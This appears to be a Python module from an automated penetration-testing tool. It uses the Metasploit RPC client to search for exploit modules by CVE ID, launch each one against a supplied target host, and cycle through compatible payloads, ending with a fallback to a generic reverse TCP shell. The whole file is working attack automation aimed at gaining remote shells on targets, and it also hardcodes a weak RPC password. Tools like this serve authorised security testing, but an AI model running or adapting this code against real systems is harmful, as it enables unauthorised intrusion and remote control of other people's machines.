import socket
from time import sleep
from typing import Any, Dict, List

from pymetasploit3.msfrpc import MsfRpcClient

from modules.search_exploits import search_exploits
from modules.searchvuln import VulnerableSoftware

client = MsfRpcClient('password', ssl=True)

def metasploitSearch(keyword: str, max_exploits: int = 10) -> List[Dict[str, Any]]:
    """
    Searches Metasploit for exploits related to the given keyword.
    
    Args:
        keyword (str): The keyword to search for.
        max_exploits (int): The maximum number of exploits to return.

    Returns:
        list: A list of dictionaries representing the exploits.
    """
    exploits = []
    results = client.modules.search(keyword)
    
    for result in results:
        if result['type'] == 'exploit':
            exploits.append({
                'name': result['name'],
                'fullname': result['fullname'],
                'type': result['type']
            })
            if max_exploits > 0 and len(exploits) >= max_exploits:
                break
                
    return exploits

def search_exploits(vulnerability: Dict[str, Any], log) -> List[str]:
    """
    Search for exploits related to a given vulnerability using Metasploit.
    
    :param vulnerability: A dictionary containing vulnerability details.
    :param log: Logger object for logging.
    :return: A list of exploit module names.
    """
    log.logger("info", f"Searching for exploits related to {vulnerability['CVEID']}")
    
    exploits = metasploitSearch(vulnerability['CVEID'])
    exploit_names = [exploit['fullname'] for exploit in exploits if exploit['type'] == 'exploit']
    
    log.logger("info", f"Found {len(exploit_names)} exploits for {vulnerability['CVEID']}")
    return exploit_names

def exploit_vulnerability(vulnerability: VulnerableSoftware, target: str, log) -> None:
    """
    Exploit a given vulnerability on the target.
    
    :param vulnerability: A VulnerableSoftware object containing vulnerability details.
    :param target: The target IP address or hostname.
    :param log: Logger object for logging.
    """
    log.logger("info", f"Exploiting {vulnerability.CVEs[0]} on {target}")
    
    exploit_names = search_exploits({"CVEID": vulnerability.CVEs[0]}, log)
    
    for exploit_name in exploit_names:
        log.logger("info", f"Using exploit {exploit_name} for {vulnerability.CVEs[0]}")
        exploit = client.modules.use('exploit', exploit_name)
        hostname = socket.gethostname()
        IPAddrUser = socket.gethostbyname(hostname)
        exploit['LHOST'] = IPAddrUser
        exploit['RHOSTS'] = target
        
        compatible_payloads = exploit.targetpayloads()
        
        for payload_name in compatible_payloads:
            try:
                payload = client.modules.use('payload', payload_name)
                exploit.execute(payload=payload)
                log.logger("info", f"Successfully executed {payload_name} for {exploit_name}")
                return
            except Exception as e:
                log.logger("error", f"Failed to execute payload {payload_name}: {e}")

        try:
            log.logger("info", f"Trying default payload for {exploit_name}")
            payload = client.modules.use('payload', 'generic/shell_reverse_tcp')
            exploit.execute(payload=payload)
        except Exception as e:
            log.logger("error", f"Default payload failed: {e}")

def exploit_vulnerabilities(vulnerabilities: List[VulnerableSoftware], target: str, log, console, max_exploits: int = 10) -> None:
    """
    Exploit a list of vulnerabilities on the target.
    
    :param vulnerabilities: A list of VulnerableSoftware objects containing vulnerability details.
    :param target: The target IP address or hostname.
    :param log: Logger object for logging.
    :param console: Rich console object for displaying status.
    :param max_exploits: Maximum number of exploits to attempt.
    """
    for vulnerability in vulnerabilities:
        with console.status(f"[white]Exploiting[/white] [red]{vulnerability.CVEs[0]}[/red] [white]...[/white]", spinner="bouncingBar") as status:
            exploit_vulnerability(vulnerability, target, log)
            sleep(1)  # Adding a delay to ensure proper logging and execution
